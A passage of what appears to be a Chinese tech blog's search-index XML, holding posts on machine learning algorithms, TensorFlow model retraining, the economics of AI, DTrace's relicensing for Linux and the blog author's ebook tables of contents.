强化学习Reinforcement learning is an area of machine learning inspired by behaviorist psychology, concerned with how software agents ought to take actions in an environment so as to maximize some notion of cumulative reward. The problem, due to its generality, is studied in many other disciplines, such as game theory, control theory, operations research, information theory, simulation-based optimization, multi-agent systems, swarm intelligence, statistics, and genetic algorithms. In the operations research and control literature, the field where reinforcement learning methods are studied is called approximate dynamic programming. The problem has been studied in the theory of optimal control, though most studies are concerned with the existence of optimal solutions and their characterization, and not with the learning or approximation aspects. In economics and game theory, reinforcement learning may be used to explain how equilibrium may arise under bounded rationality. 强化学习是机器学习中的一个领域，强调如何基于环境而行动，以取得最大化的预期利益。其灵感来源于心理学中的行为主义理论，即有机体如何在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。这个方法具有普适性，因此在其他许多领域都有研究，例如博弈论、控制论、运筹学、信息论、模拟优化方法、多主体系统学习、群体智能、统计学以及遗传算法。在运筹学和控制理论研究的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。在最优控制理论中也有研究这个问题，虽然大部分的研究是关于最优解的存在和特性，并非是学习或者近似方面。在经济学和博弈论中，强化学习被用来解释在有限理性的条件下如何出现平衡。 Open Source LibraryTensorFlowTensorFlow is an open source software library for machine learning in various kinds of perceptual and language understanding tasks. It is a second-generation API which is currently used for both research and production by 50 different teams in dozens of commercial Google products, such as speech recognition, Gmail, Google Photos, and Search. These teams had previously used DistBelief, a first-generation API. TensorFlow was originally developed by the Google Brain team for Google’s research and production purposes and later released under the Apache 2.0 open source license on November 9, 2015. Scikit-Learn 机器学习算法库Scikit-Learn(formerly scikits.learn) is a free software machine learning library for the Python programming language. It features various classification, regression and clustering algorithms including support vector machines, random forests, gradient boosting, k-means and DBSCAN, and is designed to interoperate with the Python numerical and scientific libraries NumPy and SciPy. COCO SSDOk that worked pretty well, but how do we deal with images that show multiple objects. Well to recognize multiple objects in a single image, we will utilize what’s called a Single Shot Multibox Detector (SSD). In our second example we will look at a SSD model trained with the COCO (Common Object in Context) dataset. The model we are using has been trained on 84 different classes. 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-TensorFlow-ProtoBuf]]></title>
    <url>%2F2018%2F03%2F20%2FMachine-Learning-TensorFlow-ProtoBuf%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 簡介 Google Protocol Buffer Tensorflow框架实现中的“三”种图 Tensorflow将模型导出为一个文件及接口设置 How to use Dataset in TensorFlow| The built-in Input Pipeline. Never use ‘feed-dict’ anymore Deploy TensorFlow models | Super fast and concise tutorial]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[AI产业资讯：经济学家谈人工智能]]></title>
    <url>%2F2018%2F03%2F09%2FMachine-Learning-Economist%2F</url>
    <content type="text"><![CDATA[摘要 为什么人工智能的繁荣没有提高生产率 Artificial Intelligence is a General Purpose Technology Measuring AI Capital Previous Posts Machine Learning:人工智能媒体报道集 媒体报道|经济学人：译者的悲伤 | 20170527 媒体报道|经济学人：计算机如何学习人类语言？| 20170111 为什么人工智能的繁荣没有提高生产率人工智能技术的进步无处不在，从自动驾驶汽车到机器人助理到高级语音识别。到处都是，除了生产力统计数据。这种情况看起来像是索洛悖论（Solow Paradox，又称 Productivity Paradox 生产率悖论）的重演，1987 年由麻省理工学院（ MIT，Massachusetts Institute of Technology）经济学家和诺贝尔奖得主罗伯特·索洛所阐述的理论。最近一项研究认为索洛悖论的罪魁祸首可能是实施新技术的滞后，研究人员包括 MIT 斯隆管理学院的教授 Erik Brynjolfsson，MIT 博士生 Daniel Rock 和芝加哥大学布斯商学院（University of Chicago Booth School of Business）的经济学教授 Chad Syverson。 根据市场调研公司 CB Insights 的数据，尽管以科技为中心的纳斯达克综合指数（Nasdaq Composite Index）从 2012 年到 2017 年翻了一番，与人工智能相关的技术投资在 2016 年激增了八倍以上、超过 50 亿美元。但这些并没有促进劳动生产率（labor-productivity）的增长，2005 年到 2017 年的增长率还不到 1995 年至 2004 年年均增长率（3％）的一半。 尽管如此，研究人员认为依然有理由持乐观态度，他们认为新技术需要时间在整个经济中传播和实施。他们引用了蒸汽机，电力和内燃机的案例，这些发明都是通过几年和几十年的时间才发挥变革性影响。因为这些技术的广泛应用还需要其他配套技术创新。研究人员指出，交流电安全实用三十年后，至少有一半的美国制造商还没有通电，因为制造商还没有弄清楚如何基于小型电动机重组生产过程。研究人员说这并不罕见; 企业几乎总是花费更多的精力来重新设计业务流程和培训人员，而不是为自己购买新技术。 Artificial Intelligence is a General Purpose Technology As important as specific applications of AI may be, we argue that the more important economic effects of AI, machine learning, and associated new technologies stem from the fact that they embody the characteristics of general purpose technologies (GPTs). 例如，机器学习系统（machine learning system）已经将机器的能力转化为执行许多基本的知觉类型，以实现更广泛的应用。机器视觉 – 查看和识别物体的能力，在照片中标记它们，并解读视频流。识别错误率地改善，从1/30(帧) 提高到 1/30万(帧)，自动驾驶汽车越来越具有可行性。 Measuring AI Capital研究人员提出人工智能应视为新的资本形式，确切说是一种无形资本，这种资本会随着投资的增加而累积，会对生产率持续产生作用，其价值会发生折旧（随着时间流逝而贬值）。 引入人工智能技术而产生的成本、组织变革、新技能等因素需要纳入到无形资本的框架当中并构建新的预测模型（J-Curve），随后的实证研究表明，新的模型可以更好地反映技术对生产率增长的影响作用。 人工智能的影响评估结果取决于各国统计方案中如何衡量人工智能资本（AI ）。人工智能资本计量的主要困难在于其许多产出将是无形的。人工智能大量使用在财务上体现作为其他资本的投入，包括新型软件，以及人力和组织资本，而不是最终消费品。包括人力资本在内的其他大部分资本，与 AI 本身一样，大部分都是无形的。 更具体地说，有效使用人工智能需要开发数据集，建立企业的专业人力资本，并实施新的业务流程。这些都需要大量的资本支出和维护。在古典增长核算模型中，这些无形支出的有形对应物（包括计算资源，服务器和房地产的购买）很容易衡量。另一方面，与之配套的生产投资价值则很难量化。在购买资本资产后，企业还会产生额外的调整成本（adjustment costs）。例如，业务流程重新设计和安装成本。 Much of the market value of AI capital specifically and IT capital more generally may be derived from the capitalized short-term quasi-rents earned by firms that have already reorganized to extract service flows from new investment. 人工智能悖论与世界的变化是一致的。研究人员考虑了悖论的其他可能原因，其中包括对 AI 的盲目乐观，生产力效益正在发生但被误判，新技术的收益存在但仅限于一小部分工人，给出的解释是实现延迟（here’s an implementation delay）。他们写道：“这种看似悖论的两半都是正确的”。在这个观点中，预示着随着应用的扩展，人工智能技术突破对生产力的影响将越来越大。人工智能投资成本高昂，需要配套设施的发展，需要时间和资源来实施。 背景知识：索洛悖论20世纪80年代末，美国学者查斯曼(Strassman)调查了292个企业，结果发现这些企业的IT投资和投资回报率(ROI)之间没有明显的关联。 1987 年获得诺贝尔奖的经济学家罗伯特·索洛(Robert Solow)将这种现象称为“生产率悖论”(Productivity Paradox)：“我们到处都看得见计算机，就是在生产率统计方面却看不见计算机（Computers everywhere except in the productivity statistics.）”。 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 Artificial Intelligence and the Modern Productivity Paradox: A Clash of Expectations and Statistics why-ai-boom-isn-t-boosting-productivity 论文代写了解一下：要价63000美元的枪手论文是如何产生的？]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Machine-Learning</tag>
        <tag>Manager</tag>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-Keras]]></title>
    <url>%2F2018%2F03%2F07%2FMachine-Learning-Keras%2F</url>
    <content type="text"><![CDATA[摘要 资源 A neural network that transforms a screenshot into a static website 参考文献 Prophecy Fulfilled: Keras and Cloudera Data Science Workbench]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine-Learning-NLP]]></title>
    <url>%2F2018%2F03%2F07%2FMachine-Learning-NLP%2F</url>
    <content type="text"><![CDATA[摘要 参考文献 How to solve 90% of NLP problems: a step-by-step guide | Using Machine Learning to understand and leverage text Robbie Allen:Learning Machine Learning and NLP from 187 Quora Questions Google神经机器翻译系统实现Zero-Shot翻译]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《数据可视化》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-DVM%2F</url>
    <content type="text"><![CDATA[摘要 《The Linux Perf Master》 《The Cyber-Security Master》 《The Machine Learning Master》 If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman 简介https://legacy.gitbook.com/book/riboseyim/ebook-data-visualization-master 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
        <tag>数据可视化</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《The Cyber-Security Master》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-CSM%2F</url>
    <content type="text"><![CDATA[摘要 《The Linux Perf Master》 《The Cyber-Security Master》 《The Machine Learning Master》 If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman 简介目录 Chapter 1: 网络监控技术 性能优化思路：从珠海航展交通管控实践谈起 新一代Ntopng网络流量监控—可视化和架构分析 基于数据分析的网络态势感知 网络数据包的捕获、过滤和分析 Chapter 2: 网络安全技术 警惕 Wi-Fi 漏洞，争取安全上网 Web应用安全：攻击、防护和检测 IPv6 网络协议与网络安全 OpenSSH 并不安全 Linux/XOR.DDoS 木马样本分析 Chapter 3: 网络安全治理 事与愿违的后门程序 美国网络安全立法策略 香港警务处网络安全与科技罪案调查科 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>SRE</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电子书：《Machine Learning Master》]]></title>
    <url>%2F2018%2F03%2F02%2FeBook-MLM%2F</url>
    <content type="text"><![CDATA[摘要 《The Linux Perf Master》 《The Cyber-Security Master》 《The Machine Learning Master》 If you cannot explain something in simple terms, you don’t understand it. The best way to learn is to teach. —— Richard Feynman 简介目录 Chapter 1: 机器学习导论 神经网络基础 机器学习项目 Top 30 Chapter 2: 机器学习算法 机器学习算法 Top 10 如何选择机器学习算法 Chapter 3: 机器学习应用开发 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Chapter N: 人工智能与社会 经济学家谈人工智能 经济学人：计算机如何学习人类语言？ 经济学人：译者为何忧虑？ 下载国内用户访问GitBook不太稳定，提供百度云快捷下载，同时提供了pdf、mobi、ePub三种格式。 历史版本基本原则：持续发布，争取做到每四个月发布一个新版本 Edition 0.1 20180508 调整章节结构 add 神经网络基础 add 如何选择机器学习算法 add 经济学家谈人工智能 Edition 0.1 201803 Chapter 1: 机器学习导论 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js 机器学习算法 Top 10 机器学习项目 Top 30 Chapter N: 媒体报道集 经济学人：计算机如何学习人类语言？ 经济学人：译者为何忧虑？]]></content>
      <categories>
        <category>出版物</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>eBook</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
        <tag>Writing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Machine Learning:Training Models]]></title>
    <url>%2F2018%2F02%2F27%2FMachine-Learning-TrainModel%2F</url>
    <content type="text"><![CDATA[摘要 Previous前文回顾： Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js 上面的文章中提到了机器学习的预测结果受模型质量的影响很大，如果想要取得好的效果需要通过训练增强优化。 Training Data1curl http://download.tensorflow.org/example_images/flower_photos.tgz \| tar xz -C tf_files Training the Network1git clone https://github.com/googlecodelabs/tensorflow-for-poets-2 1234python scripts/retrain.py--image_dir=tf_files/flower_photos--output_graph=tf_files/retrained_graph.pb--output_labels=tf_files/retrained_labels.txt Test:Using the Retrained Model1python scripts/label_image.py --image data/daisy.jpg Model123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293node &#123; name: "DecodeJpeg/contents" op: "Const" attr &#123; key: "dtype" value &#123; type: DT_STRING &#125; &#125; attr &#123; key: "value" value &#123; tensor &#123; dtype: DT_STRING tensor_shape &#123; &#125; string_val: "\377\330......."&#125;&#125;&#125;&#125;node &#123;name: "softmax/biases"op: "Const"attr &#123;key: "dtype"value &#123;type: DT_FLOAT&#125;&#125;attr &#123;key: "value"value &#123;tensor &#123; dtype: DT_FLOAT tensor_shape &#123; dim &#123; size: 1008 &#125; &#125; tensor_content: "\312\277\006"&#125;&#125;&#125;&#125;node &#123;name: "softmax/logits/MatMul"op: "MatMul"input: "pool_3/_reshape"input: "softmax/weights"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;attr &#123;key: "transpose_a"value &#123;b: false&#125;&#125;attr &#123;key: "transpose_b"value &#123;b: false&#125;&#125;&#125;node &#123;name: "softmax/logits"op: "BiasAdd"input: "softmax/logits/MatMul"input: "softmax/biases"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;&#125;node &#123;name: "softmax"op: "Softmax"input: "softmax/logits"attr &#123;key: "T"value &#123;type: DT_FLOAT&#125;&#125;&#125; Optional ParametersQuestions123422:17:28.523085: W tensorflow/core/platform/cpu_feature_guard.cc:45] The TensorFlow library wasn&apos;t compiled to use FMA instructions, but these are available on your machine and could speed up CPU computations.22:17:28 NodeDef mentions attr &apos;dilations&apos; not in Op&lt;name=Conv2D; signature=input:T, filter:T -&gt; output:T; attr=T:type,allowed=[DT_HALF, DT_FLOAT]; attr=strides:list(int); attr=use_cudnn_on_gpu:bool,default=true; attr=padding:string,allowed=[&quot;SAME&quot;, &quot;VALID&quot;]; attr=data_format:string,default=&quot;NHWC&quot;,allowed=[&quot;NHWC&quot;, &quot;NCHW&quot;]&gt;; NodeDef: conv/Conv2D = Conv2D[T=DT_FLOAT, data_format=&quot;NHWC&quot;, dilations=[1, 1, 1, 1], padding=&quot;VALID&quot;, strides=[1, 2, 2, 1], use_cudnn_on_gpu=true](Mul, conv/conv2d_params). (Check whether your GraphDef-interpreting binary is up to date with your GraphDef-generating binary.).22:22:02.629987: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.2 AVX AVX2 FMA About Data Sets Fun with small image data-sets (Part 2) 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 综述论文：机器学习中的模型评价、模型选择与算法选择 | 2018-02-02 机器之心 Plug &amp; Play Machine Learning Models in GoLang | BAYESIAN CLASSIFICATION Train Your Machine Learning Models on Google’s GPUs for Free — Forever How do we ‘train’ neural networks ?]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态追踪技术(五)：DTrace for Linux]]></title>
    <url>%2F2018%2F02%2F16%2FDTrace-Linux%2F</url>
    <content type="text"><![CDATA[摘要 里程碑：DTrace 从 CDDL 切换为 GPL 许可证 里程碑：Linux 合并 BPF 里程碑：DTrace 切换到 GPL 许可证News:dtrace dropped the CDDL and switched to the GPL!根据 2月14日 Brendan Gregg 在 Twitter 上推送的消息：Oracle 已经将 DTrace 模块的开源许可证从 CDDL 切换到 GPL，预计最快到 2018 年底 Linux kernel 就可以发布一个可用的 /usr/sbin/dtrace ，底层基于 bcc 和 eBPF 。 Good news from Oracle: DTrace is GPL’d (thank you!). I’d guess by the end of 2018 we’ll have a working /usr/sbin/dtrace on Linux for running D scripts (using libbcc+eBPF on the backend) 关于动态追踪技术（Dynamic Tracing），我们在之前的文章已经有所介绍，动态追踪技术(一)：DTrace 导论 。DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能（ advanced performance analysis and troubleshooting tool ）。 Oracle 收购 SUN 公司之后推出了 Oracle Linux DTrace （基于 Oracle 企业级内核 Unbreakable Enterprise Kernel ，UEK)，针对性地发展完善了一系列探针如 syscall, profile, sdt, proc, sched 和 USDT，受制于诸多原因一直没有进入 Linux kernel 代码树，其中最大的一个障碍是许可授权问题：DTrace 源代码采用 CDDL 许可证，不兼容 Linux kernel 使用的 GPLv2 许可证，无法直接移植。 123456789commit e1744f50ee9bc1978d41db7cc93bcf30687853e6Author: Tomas Jedlicka &lt;tomas.jedlicka@oracle.com&gt;Date: Tue Aug 1 09:15:44 2017 -0400dtrace: Integrate DTrace Modules into kernel properThis changeset integrates DTrace module sources into the main kernelsource tree under the GPLv2 license. Sources have been moved toappropriate locations in the kernel tree. CDDL vs GPLDTrace 与 OpenSolaris 一样之前是基于 CDDL 许可证而不是 Linux kernel 使用的 GPL 许可证，二者的区别是什么呢？ GNU通用公共许可协议（GNU General Public License，简称 GNU GPL、GPL，港台地区翻译为“GNU通用公共授权条款”）是广泛使用的免费软件许可证，最初由GNU项目的自由软件基金会（FSF）的理查德·斯托曼（Richard Matthew Stallman）撰写。 一般的版权概念（“copyright”），从不授予用户任何权利（除了使用的权利），更多的是限制性规定，例如复制、修改、分发等，也可以包括一些法律允许的行为，比如逆向工程。GPL 则代表了知识产权制度的左翼阵营（“copyleft”），它授予被许可人以下权利（或称“自由”）： 以任何目的运行此程序的自由； 再复制的自由； 修改程序并公开发布改进版的自由（前提是能得到源代码）。 GPL 及其它 Copyleft 协议授予了被许可人（几乎是任何人）以非常广泛的自由，同时利用版权法设计了“传染机制”：GPL明确规定，任何源码的衍生产品，如果对外发布，都必须保持同样的许可证。这就是说，任何人只要发布基于某个GPL软件的修改版本，他就必须公开源码，并且同意他人可以自由地复制和分发，否则原始作者可以根据版权法起诉 。 DTrace 的 CDDL 许可证继承自 Sun Microsystems 。通用开发与发行许可证（Common Development and Distribution License，简称CDDL） 是一个由 Sun 提出的授权协议，它以 Mozilla 公共许可证（MPL）1.1版本为基础。基于 CDDL 许可证的项目主要有：OpenSolaris (含 DTrace 和 ZFS) 、NetBeans IDE 、GlassFish 等。 Like the MPL, the CDDL is a weak copyleft license in-between GPL license and BSD/MIT permissive licenses, requiring only source code files under CDDL to remain under CDDL. 鉴于 GPL 许可模式下很难通过开源软件直接盈利，因此也有很多类似 CDDL 的开源协议倾向于支持商业开发，授予厂商更大的决定权。CDDL 最大的特点是源代码和可执行文件允许采用不同的许可证。例如一般不存在 GPL 模式下存在的 “社区”版本，而是由厂商提供一些免费版本供开发者在非生产环境下使用，同时附上 CDDL 许可的源代码，开发者可以自行编译和部署；更重要的是，厂商只对付费客户提供安全补丁修复和维护版本的源代码。 综上所述，基于 CDDL 许可证的 DTrace 你只可以使用但不允许围绕代码进行修改，或者添加其他跟踪点。Paul Fox 个人贡献的dtrace4linux 项目就试图移植 Sun DTrace 到 Linux 的 ，但是受限于许可证只能做到附加产品（add-on）, 外部人员很难直接参与进来，事实上 CDDL 许可证的项目外部贡献最多一般不会超过 10% 。 Future在此之前，Linux 已经拥有 SystemTap 和动态探针（dprobes），DTrace 是基于整个系统的全局跟踪、调试、分析工具。Linux kernel 的创建者显然不喜欢一个“复杂”的系统（large system）, 他们倾向于将跟踪、分析和探测划分为彼此独立的小单元。许多开发者为此发明了各种钩子（hooks）以及整合某些特定探针（probes）的便利工具，例如 kprobes , uprobes, markers 等。 dtrace for linux 正式进入 Linux kernel 之后，有望将相关技术整合成一个更强大的体系，这一点非常令人期待。 里程碑：Linux 合并 BPF2016年11月，Linux 4.9-rc1发布，正式合并了一项重要特性：BPF追踪（Timed sampling）。 系统性能领域的国际导师Brendan Gregg，感动得都快哭了，当即在Twitter上表示这是一个重要的里程碑!他随后又写了一篇长文《DTrace for Linux 2016》，以示庆祝。 As a long time DTrace user and expert, this is an exciting milestone!–Brendan Gregg Linux 合并了BPF而已嘛，跟DTrace这个劳什子有什么关系呢？ DTrace 是动态追踪技术的鼻祖，源自 Solaris 操作系统，提供了高级性能分析和调试功能，它的源代码采用 CDDL 许可证，不兼容 Linux 内核使用的 GPLv2 许可证，无法直接移植。当然，江湖上还有另外一种说法，Linux之所以一直没有原生支持DTrace,是因为Linus 觉得这玩意没什么必要。Anyway,随着 BPF跟踪的最后主要功能合并到 Linux 4.9-rc1，Linux 现在有了类似 DTrace 的高级分析和调试功能。 Linux 这次合并的BPF（The Berkeley Packet Filter ），来自于加州大学伯克利分校（这所大学很有意思，以后还要反复提到）。BPF，顾名思义，最早只是一个纯粹的封包过滤器，后来在很多牛人的参与下，进行了扩展，得到了一个所谓的 eBPF，可以作为某种更加通用的内核虚拟机。通过这种机制，我们其实可以在 Linux 中构建类似 DTrace 那种常驻内核的动态追踪虚拟机。 Linux 没有 DTrace（名字），但现在有了 DTrace（功能） 扩展阅读：动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 DTRACE FOR LINUX; ORACLE DOES THE RIGHT THING | February 14, 2018 | MARK J. WIELAARD Oracle Linux DTrace]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI产业资讯：机器学习技术与知识产权法]]></title>
    <url>%2F2018%2F02%2F16%2FMachine-Learning-Law%2F</url>
    <content type="text"><![CDATA[摘要 判例 上海智臻智能网络科技股份有限公司、苹果电脑贸易（上海）有限公司与国家知识产权局专利复审委员会再审行政裁定书 扩展阅读《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 参考文献 专利制度会阻碍科技进步吗？就 AI 领域而言，这一趋势愈加明显 基于深度学习对医疗数据进行分析的方法及其智能分析仪 一种基于机器学习的在线管网异常侦测系统 基于机器学习的专利数据处理方法及其处理系统 人工智能与法律问题初探 | 2017年11月29日 作者: 蔡雄山]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Policy&amp;Law</tag>
        <tag>Economist</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|机器学习算法]]></title>
    <url>%2F2018%2F02%2F10%2FMachine-Learning-Algorithms%2F</url>
    <content type="text"><![CDATA[摘要 机器学习算法分类：监督学习、半监督学习、无监督学习、强化学习 基本的机器学习算法：线性回归、支持向量机(SVM)、最近邻居(KNN)、逻辑回归、决策树、k平均、随机森林、朴素贝叶斯、降维、梯度增强 公式、图示、案例 机器学习算法分类机器学习算法大致可以分为： 监督学习 | Supervised learning 半监督学习 | Semi-supervised learning 无监督学习 | Unsupervised learning 强化学习 | Reinforcement learning 监督学习 | Supervised learning监督学习算法基于一组示例进行预测。在监督学习训练过程中，可以由训练数据集学到或建立一个模式（函数 / learning model），并依此模式推测新的实例。 监督学习算法要求特定的输入/输出，一个常见的例子是根据当年和前几年的销售情况估算下一年的销售额。首先需要决定 使用哪种数据作为范例。例如，文字识别应用中一个手写的字符，或一行手写文字。监督学习主要算法包括神经网络、支持向量机、最近邻居法、朴素贝叶斯法、决策树等。 分类（Classification）：当数据被用于预测分类变量时，监督学习也被称为分类。为图像分配标签或指示器（例如狗或猫）时就是这种情况。当只有两个标签时，这称为二进制分类（ binary classification）。当有两个以上的类别时，这些问题被称为多级分类（multi-class classification）。 回归（Regression）：当我们需要预测连续值时，就变成了回归问题。 预测（Forecasting）：根据过去和现在的数据对未来进行预测的过程。它最常用于分析趋势。 半监督学习 | Semi-supervised learning监督学习带来的挑战是标签数据可能非常昂贵而且耗时。如果标签有限，可以使用未标记的示例来增强监督式学习。因为在这种情况下机器没有完全监督，所以我们说机器是半监督的。使用半监督学习，您可以使用带有少量标签数据的未标记示例来提高学习的准确性。 无监督学习 | Unsupervised learning无监督学习算法没有特定的目标输出，算法将数据集分为不同的组。 在进行无监督学习时，机器会显示完全未标记的数据。它要求发现数据基础的内在模式，例如聚类结构（clustering structure），低维流形（a low-dimensional manifold）或稀疏树（sparse tree ）和图（graph）。 聚类（Clustering）：对一组数据示例进行分组，使一个组（或一个聚类）中的示例与其他组中的示例更相似（根据某些标准）。这通常用于将整个数据集分成几个组。可以在每个组中进行分析以帮助用户找到固有模式。 降维（Dimension reduction）：减少需要考虑的变量数量。在许多应用中，原始数据具有非常高的维度特征，并且一些特征对于任务是多余的或不相关的。降维有助于找到数据内在真实的、潜在的关系。 强化学习 | Reinforcement learning强化学习强调通过基于环境的反馈行为分析、优化以取得最佳预期。机器尝试不同的场景来发现哪些行为能产生最大的回报，而不是被告知要采取何种行动。反复试验（Trial-and-error）和延迟奖励（delayed reward）是将强化学习与其他技术区分开来的关键。 强化学习普适性强，主要基于决策进行训练，算法根据输出结果（决策）的成功或错误来训练自己，通过大量经验训练优化后的算法将能够给出较好的预测。类似有机体在环境给予的奖励或惩罚的刺激下，逐步形成对刺激的预期，产生能获得最大利益的习惯性行为。在运筹学和控制论的语境下，强化学习被称作“近似动态规划”（approximate dynamic programming，ADP）。 机器学习算法列表 线性回归算法 Linear Regression 支持向量机算法 (Support Vector Machine,SVM) 最近邻居/k-近邻算法 (K-Nearest Neighbors,KNN) 逻辑回归算法 Logistic Regression 决策树算法 Decision Tree k-平均算法 K-Means 随机森林算法 Random Forest 朴素贝叶斯算法 Naive Bayes 降维算法 Dimensional Reduction 梯度增强算法 Gradient Boosting 1. 线性回归算法 Linear Regression回归分析（Regression Analysis）是统计学的数据分析方法，目的在于了解两个或多个变量间是否相关、相关方向与强度，并建立数学模型以便观察特定变量来预测其它变量的变化情况。 线性回归算法（Linear Regression）的建模过程就是使用数据点来寻找最佳拟合线。公式，y = m*x + c，其中 y 是因变量，x 是自变量，利用给定的数据集求 m 和 c 的值。线性回归又分为两种类型，即 简单线性回归（simple linear regression)，只有 1 个自变量；多变量回归（multiple regression)，至少两组以上自变量。 下面是一个线性回归示例：基于 Python scikit-learn 工具包描述。 123456789101112131415161718from sklearn import linear_model, datasets#digit dataset from sklearndigits = datasets.load_digits()#create the LinearRegression modelclf = linear_model.LinearRegression()#set training setx, y = digits.data[:-1], digits.target[:-1]#train modelclf.fit(x, y)#predicty_pred = clf.predict([digits.data[-1]])y_true = digits.target[-1]print(y_pred)print(y_true) 2. 支持向量机算法(Support Vector 